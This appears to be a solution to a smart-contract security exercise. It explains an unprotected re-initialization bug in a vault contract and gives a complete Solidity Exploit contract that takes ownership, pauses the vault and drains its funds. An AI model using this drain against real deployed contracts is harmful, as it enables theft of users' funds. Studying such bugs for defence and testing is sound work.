@@ -1,0 +1,34 @@
+The bug is in `initialize`. It checks `_initialized` but never sets it to true, so anyone can call it again and take ownership. The exploit does the following:
+
+1. Re-initializes the vault with the Exploit contract as owner.
+2. Pauses the vault.
+3. Calls `emergencyWithdraw` to drain all funds to itself.
+
+This leaves the vault's balance at 0 while `totalDeposits` is still 10 ether, which breaks the invariant. On a patched vault that sets the flag, `initialize` reverts, so the invariant holds.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.28;
+
+interface IInitVault {
+    function initialize(address owner_, uint256 withdrawLimit_) external;
+    function setPaused(bool paused_) external;
+    function emergencyWithdraw(address payable to) external;
+}
+
+contract Exploit {
+    IInitVault public vault;
+
+    constructor(address target) payable {
+        vault = IInitVault(target);
+    }
+
+    function run() external {
+        vault.initialize(address(this), type(uint256).max);
+        vault.setPaused(true);
+        vault.emergencyWithdraw(payable(address(this)));
+    }
+
+    receive() external payable {}
+}
+```
